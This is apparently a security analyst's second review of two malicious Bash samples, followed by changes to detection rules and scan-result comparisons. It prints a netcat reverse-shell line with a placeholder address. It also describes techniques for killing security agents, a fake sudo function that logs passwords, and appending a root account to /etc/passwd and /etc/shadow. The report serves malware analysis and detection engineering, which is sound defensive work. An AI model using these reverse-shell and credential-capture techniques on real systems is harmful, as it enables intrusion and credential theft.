Second review of CL-UNK-1211-labelled Bash snippets
=================================================

Both supplied files are **MALICIOUS** on behavioral evidence. The labels in
comments identify the claimed campaign, not verified provenance or attribution.
No registry coordinates, parent package, authorized exercise, or deployment
context accompanied these standalone scripts. The comments and placeholder hash
suggest an illustrative/reconstructed attack snippet is possible; that does not
make its active remote-shell and process-killing commands inert.

Samples and execution paths
---------------------------

* `684dea80bafffe8f0274a78058d3fead06b630e2de36ff880f8ac6d082e77165`
  (819 bytes): CL-UNK-1211-labelled Bash snippet with UID-0 account writes.
* `3738a834b5f06f8a42860d835c465fe36aef44503f61aa0c9c74d40893212bc1`
  (648 bytes): the same attack snippet without the account database writes.

Both hashes were verified, and `bash -n` accepted both scripts. Neither was
executed. Complete source and `cleave facts` call/flow projections were reviewed;
there are no encoded layers, archive members, downloads, or hidden payloads.

1. At top level, `pgrep -f pmd` gates `pkill -9 -f pmd` with `&&`; another
   independent pair targets `cortex`. These match entire command lines, and
   termination requires authority over the selected processes. There is no
   `set -e`: failed discovery or termination does not stop later actions.
   The paired names and source's EDR context support intended security-agent
   termination. A bare Cortex string alone does not identify an XDR product.
2. Each defines a function named `sudo`. When invoked, it silently prompts for
   a password, appends `USER:pass` to a local temporary log, and pipes the same
   password to `/usr/bin/sudo -S` with the original arguments. This is a
   credential interception capability, not credential exfiltration. The script
   itself never calls this function, exports it, or writes a shell startup
   file. Ordinary standalone execution does not install a persistent sudo
   hook. Sourcing the script would define it in the caller's shell.
3. Only the larger variant appends a UID/GID-zero account line to the real
   `/etc/passwd` and a corresponding shadow record to `/etc/shadow`. These
   writes require existing privileges; they do not acquire them. The literal
   `$6$salt$hashedpassword` is a placeholder rather than a usable SHA-512-crypt
   password hash. This supports attempted account implantation, not proof of
   a working authenticated login. The existing database-write traits describe
   the static writes accurately and were retained.
4. Both remove `/tmp/f`, create a FIFO there, then run
   `cat FIFO | /bin/bash -i 2>&1 | nc ADDRESS 443 >FIFO`.
   Network input goes through the FIFO into Bash; merged shell output goes
   back to the outbound netcat peer. This is an active, bidirectional reverse
   shell with a literal public destination, not an ordinary file transfer.
   Port 443 does not supply TLS. There is no authorization gate, test runner,
   retry loop, automatic reboot activation, or cleanup after the session.

The immediate reverse-shell attempt, targeted force kills, credential logger,
and (in the larger variant) account writes outweigh the missing deployment
context. An engineer finding these scripts would reasonably treat them as
malicious attack material. No campaign attribution, successful connection,
working persistence, or actual credential collection is asserted.

Rule changes and preservation review
------------------------------------

* Extend the existing `force-kill-pmd` matcher to recognize the optional `-f`
  before its target. Keep signal, command, and target bound in one matcher.
  Require a complete target token: the previous word boundary also accepted
  `pkill -9 pmd-worker`, which names another process. Legacy exact `pmd` and
  the newly covered command-line-match spelling remain detected.
* The old `shell-sudo-credential-interception` rule falsely convicted both a
  password-forwarding sudo helper and a confirmation-only sudo wrapper.
  It now requires the existing credential-pair log observation in addition
  to the hook, prompt, and real-sudo context. Both supplied scripts and the
  generalized credential logger retain both credential-interception rules.
  Remove T1546.004 from this composite: no startup/profile modification is
  required by its matcher.
* Relocate neutral sudo path, command-override, and prompt observations to
  filesystem executable paths, process hooking, and UI prompts. The broad
  prompt disjunction is named for its actual read-or-password alternatives.
  Preserve matchers, effective scopes, exclusions, and explicit consumers.
* Move the quoted silent-password command observation to UI prompts and set
  it to notable: ordinary silent password input crosses no security boundary.
  Its description now states that the matcher searches a string. A quoted
  ordinary input helper exercises this correction; its password-encoding
  composite continues to reference the relocated atom.
* Move the security-vendor filter observations and process-search composite
  from anti-AV evasion to host/security discovery, preserving their matchers,
  severities, scopes, and the teardown consumer.
* Placement auditing found four dialog-child widget APIs in the prompt leaf
  and a bare `eventvwr.exe` reference among executable-path rules. Relocate
  them unchanged to existing widget and basename leaves. This also leaves
  all destination catalogs within their existing budgets without dropping
  any detection, raising a budget, or inventing a directory split.

`relocations.json` records every changed ID; `ancestor-consumers.txt` records
reviewed directory selectors, including broad process-creation, credential,
UI, and filesystem parents. Exact consumers were updated, including native
sudo capture, EDR teardown, and Event Viewer UAC hijacks. A generic sudo path
must no longer supply execution evidence to a process-creation selector;
ordinary prompt and override facts must no longer supply credential theft
on their own to a credential selector. The focused outside-batch fixtures
retained every finding after ID relocation. No supported attack coverage was
lost in the requested samples or those fixtures.

Verification and scan comparison
--------------------------------

Run the static controls without executing their generated scripts:

    python3 testdata/cl-unk-second-review/check.py SCRATCH after
    python3 testdata/cl-unk-second-review/placement-check.py SCRATCH-PLACEMENT

The first command expects the pre-change `before-traits.json` captured by
running the same check with `before` in SCRATCH. It covers ordinary wrappers,
credential logging, quoted input, legacy and `-f` process kills, unrelated and
similarly named targets, FIFO file transfer versus shell relay, plus four
existing outside-batch fixtures (UID-0 implantation, a zsh alias fixture,
consented installation, and a cloud-agent teardown payload). The placement
check verifies actual PE import matchers and string-only near misses through
`test-rules`: unmatched baseline atoms are stripped from ordinary scan output,
so their absence there is not a matcher failure. It also checks the moved
Event Viewer basename observation. Existing PE target-binding fixtures retain
the security-kill match only for the bound security-product command. The
broader bitmap checker stopped at its unrelated pre-existing CIL-sequence
assertion; its three EDR target-binding results were checked separately.

Both original and final atomscan runs used the local traits. JSON comparison
maps relocated IDs before computing differences; ordinary interpret output
omits some composites and is insufficient for this comparison.

| Sample | Risk before → after | ML probability before → after | Level |
|---|---:|---:|---:|
| 684dea80baff | 404 → 518 | 0.9997995 → 0.9997739 | 0 → 0 |
| 3738a834b5f0 | 287 → 402 | 0.9997309 → 0.9997052 | 0 → 0 |

Every original sample finding survives after relocation, at the same severity.
Both gain the existing force-kill-pmd, security-process-termination,
security-product image grouping, and enumeration/termination composite.
The larger sample has six hostile and four suspicious findings; the smaller
has five hostile and three suspicious findings. These include distinct
reverse-shell, credential interception, and EDR termination behaviors, plus
account implantation in the larger variant. No archive members exist.

There is no sample verdict/classifier disagreement and no material detection
loss. Atomscan reports that its model bundle is feature-spec v18 while the
extractor is v19; the probabilities above are the actual returned results.
